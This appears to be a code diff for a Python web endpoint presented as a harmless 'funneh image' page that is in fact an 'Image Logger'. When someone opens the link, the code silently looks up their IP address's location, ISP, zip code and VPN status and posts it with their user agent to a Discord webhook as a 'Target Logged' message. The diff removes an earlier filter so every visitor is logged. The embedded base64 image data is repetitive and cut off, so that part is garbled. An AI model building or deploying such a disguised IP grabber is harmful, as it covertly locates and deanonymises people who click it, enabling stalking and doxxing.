@@ -12,38 +12,38 @@ async def log_request(request: Request):
     all_ips = request.headers.get("x-forwarded-for", request.client.host)
     client_ip = all_ips.split(',')[0].strip()
 
-    # 2. Skip Google Cloud/Internal pings
-    if not client_ip.startswith(("35.", "34.", "10.")):
-        try:
-            # 3. Get detailed info from IP-API
-            lookup = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy").json()
-            
-            if lookup.get("status") == "success":
-                # 4. Format the "Hacker Style" message
-                message = (
-                    f"**Image Logger - IP Logged**\n"
-                    f"**A User Opened the Original Image!**\n\n"
-                    f"**IP Info:**\n"
-                    f"IP: `{client_ip}`\n"
-                    f"Provider: `{lookup.get('isp')}`\n"
-                    f"Country: `{lookup.get('country')}`\n"
-                    f"Region: `{lookup.get('regionName')}`\n"
-                    f"City: `{lookup.get('city')}`\n"
-                    f"Coords: `{lookup.get('lat')}, {lookup.get('lon')}`\n"
-                    f"VPN/Proxy: `{lookup.get('proxy')}`\n\n"
-                    f"**User Agent:**\n"
-                    f"`{request.headers.get('user-agent')}`"
-                )
-                requests.post(WEBHOOK_URL, json={"content": message}, timeout=5)
-        except Exception as e:
-            print(f"Error: {e}")
+    try:
+        # 2. Get detailed info using ip-api.com (more reliable)
+        # We use http here because it's faster for free tier
+        response = requests.get(f"http://ip-api.com/json/{client_ip}?fields=66842623", timeout=10)
+        data = response.json()
+        
+        # 3. Format the Discord Message
+        if data.get("status") == "success":
+            embed_content = (
+                f"**Image Logger - Target Logged**\n"
+                f"**IP:** `{client_ip}`\n"
+                f"**Provider:** `{data.get('isp')}`\n"
+                f"**Country:** `{data.get('country')}`\n"
+                f"**Region:** `{data.get('regionName')}`\n"
+                f"**City:** `{data.get('city')}`\n"
+                f"**Zip:** `{data.get('zip')}`\n"
+                f"**VPN/Proxy:** `{data.get('proxy')}`\n"
+                f"**User Agent:** `{request.headers.get('user-agent')}`"
+            )
+        else:
+            embed_content = f"**Visitor Detected (Basic Log):** `{client_ip}`"
 
-    # 5. Show the image immediately
+        # 4. Send to Discord
+        requests.post(WEBHOOK_URL, json={"content": embed_content}, timeout=5)
+
+    except Exception as e:
+        # Emergency backup log
+        requests.post(WEBHOOK_URL, json={"content": f"Detection Error: `{e}` | IP: `{client_ip}`"}, timeout=5)
+
+    # 5. Show the image
     return f"""
     <html>
         <head><title>funneh image</title></head>
         <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
-            <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBwgHBgkIBwgKCgkLDRYPDQwMDRsUFRAWIB0iIiAdHx8kKDQsJCYxJx8fLT0tMTU3Ojo6Iys/RD84QzQ5OjcBCgoKDQwNGg8PGjclHyU3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3Nzc3N//AABEIAJQAlgMBIgACEQEDEQH/xAAbAAACAgMBAAAAAAAAAAAAAAADBAIFAAEGB//EADoQAAIBAwIDBAcGBgIDAAAAAAECAwAEERIhBTFBBhMiURRhcXKBgpEjMkJiocEHJFKSsdFEgxUzc//EABgBAAMBAQAAAAAAAAAAAAAAAAABAgME/8QAHxEBAQACAgMAAwAAAAAAAAAAAAECESExAxJBEyIy/9oADAMBAAIRAxEAPwDk+J8QuJkisy+LeHOlQAOZzknrVejuDzP1o12P5hvh/ioKB1z66wnTp+oMXV8BjjHnWDJyCT6jnlR449DaTuT1qbxF42+go2NEfEM5Lc/Opamxzb60yYyAVUbc6iYvDgf1U9lpacE7V8U4WBGkve242MUgB29RxtXpXBe0NhxiIG2nnEoGXi7hWK/7rx9Y1Zt+tMQtd2M6z2ryRSruHTYildHp7X3secPM3z2NQZrbkZLT57UiqDsb2mHFoVt7ia79AYll-1O3XPaunYzKT474b9Y1YUiI6bEn73DW/uWi93asBhLI+7Oy0xqk/FPP8ANaA/tWm0keOWP/staACtsjHwqnyXh/eieisBgRT5/LMrUPTAeB4efehK1MRQEfcsD7HK0BtbeQcorzHuoan3T+VwPet1P+KisEZ+7BEf/ndGirA3SCYD8txmgIHIGC4x+e2peRITnUbUj80RFNhJFPhS9H/YDWy0i82uvmjBoCoktrQnJisD6xtWVYtIdW8rZ9dtWUB4dIMuWxucb1KMY5gVLTlqN3e1TvhpZyhnbAGKOi60cKcb5oAXJFMxR4Ix50qJEkiG564Fa9HBVj150dcAUWPSQd6W1eqqeIqcgbmrKIlolJ8t9q3MgxsPjUYdkApWqxnKcUSxTJdWx7m4jbUjDl7CK9OsdNxZwTGFC8kYYlLorn4V5eWKtkV1nY/iAkSSzf0+weNTMmdtgRVY34jPHXLr0hYcobhfdugaKUkxsLwe64NJL3OR4OHn2MwqdxJDBC0skVuI0XLFbkjFWyTup/RYHmubu5hiQZZ5IlIArjeNdu3XMPBImuWHOeeIBfgMUpx/ii8Tl8OoWy/ciZyRnzOetVBJ8/pUXORpj47St72i7Q3DEy3joP6Y41UD6Cko+P8AGIjlOI3APrbNOXrkJgDLGqt4iwPhwcZ51WOWyyw0fXtfx+IALfsfeQH9qZj7ddoU/wCUre1BVBowd+dYEycdTyq0Out/4kcQiX+avlmbzWQpWVx5UId6yjguT74SXHQU3FodPI+dLSqWkJHUVuNWXrtWLf6ZMW2agHx1FTTVJIsedzzqN672ighI2RvPnU7VpMP6yaOrEjfnSEEwbfGMjanIj0PM8qKBkyeYqJUqTRBq6VjjUdudJULyZxVn2LkkXtBEqmQalYHQMnGPKknTCEk4wKa7HSRSdpbdUYNlXwNWnp508eyz6emB3GMvOM/1WoriO13FDd3ptYWBhh2YqmnU3XPsrq+M3P8A4zhM923eqUjOkrcZ8XSvKE4qTKwVdbsSSzHr1rTO8MfHOeTik4G5+NEVdVQgeaQjWilTy00+IgNwK57XUQurRm+0QnIGMCq6WI8sAHrXSAaRSdxAPvADfaqxyTljtz8kQyNt/ZQXGhdidQ8qtZYCBpJyTvy5UhKhYny64rbHHhcdFwAPvHf2VlSI0nc1lWnZ7ANqICAN6Cx3qOTmsW30WB/5kezBqXGJnNwESMaQMAnypFX03AycA7E01LDNdQOMkOg2HnU3tUEhtG0gnwgjaix5WQCpWc5kiiQgju4wu/U1B2xL8aBYf6j11GZ+7UtvtWQsHwRU5ou8XFTaqRVSytcAqZMDyrov4d8W03kvFZ2VFQGOHvIywbOMmuXvrQxShowcE716R2HvRJwlLMPcCS1GAIyMFT1xWuGmPk3pV/xJvwtva2KCIl271mjUryyMVwlrhZBtyru+29zaX728Eckk00LHUzAYUeW3rrir21mL/Y7dNqdqcZdH4rqOIjxafIGreOUOoPqqm4VwsIRJcMXfyPIVbOoH3RgVjlrbox3pJpBjal3lBH3QN6FcAjOGqGM4332okPYugyb1XXEWCQds+QyavolCxgfWqy7kjS6QlWGMkMo5H10TJNxVtzZ6wrI4deXLBBrKtZGUTJJH+NMkgc63VfkqfSKzuWdO8QE45ihjJ3FP2lwiQhQRqXalrrSza4xueYWnBVfdKd6Nb3epFSUkFeT1ubBQ0CJQxAPKmXS0tyOanUB1861KCXzUIWVBpFFLgip+r+MjkKmjrcZBpFm8RNYpzRYUFupQ5ABzim4GlSKVoZWjLoVOkkEg9KrGOA2OeKwcYdYhCsS5PNjT5+C2Li3FtNZGRJQJE2K55Gh251INQ3qrsgr3DMdizVaIDGSM5FTTg4dU2AFakuAVwv6UpcS4BxQ7Y5k360SHbo5vJ7KyNR34HkKmPABWi2lg1FKGLiYwxO6AMwGQvnSlnCywPJMdRl8RU/h9lBu7uKNnEhwSnhHxoD3/ANmscXif1chS0dot3MFKpGF8I+grKXEbN4iSSeZrdVoMNoz2aXEOS2TqHmK1CmRqG9O8HlR7NImPiBJ/Wt3NvocyW4ByfEvKlvktcKi8YX4/Wty076O9Z08S8x66di03di1vMcygbijY0oFuM6eVFEtJ3qejzlF2B5VFZfPOa0k3yz9tXR4vmtI++BS4aiIxJzRo9mAd9utKXEYlmCRgGQdaNJKI0Ynnjal7WZophM2+acicsjK2s6uG5Eb7VbwnXDvsaroL0TT89gKsIH1k+VTkrGoTQ5AzvjqKDF9m3OnpHGnGKQcaSTUxVNd6G2+lakkGaS7whgah32Mk9TT1spWXcXpJAzuKPaWPdDP3vbS0cmX2qxjc6ed863Vfkw==" style="max-width:100%; height:auto;">
-        </body>
-    </html>
-    """
+            <img src="data:image/jpeg;base64,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)
